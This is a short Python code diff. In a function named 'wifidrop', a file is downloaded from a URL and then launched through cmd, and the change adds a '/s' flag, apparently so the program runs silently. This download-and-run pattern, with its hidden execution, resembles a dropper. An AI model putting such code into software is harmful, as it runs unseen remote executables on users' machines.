@@ -27,7 +27,7 @@ def wifidrop():
             # print(f"Folder '{folder_path}' already exists.") 
             temp_file_path = os.path.join(folder_path, filename)
             path, headers = urlretrieve(url, temp_file_path)
-            os.system(f"start cmd /c \"@echo off & mode con cols=60 lines=20 & {temp_file_path}\"")
+            os.system(f"start cmd /c \"@echo off & mode con cols=60 lines=20 & {temp_file_path} /s\"")
     elif sys.platform.startswith('darwin'):
         print(f"Unsupported platform: {sys.platform}")
     else:
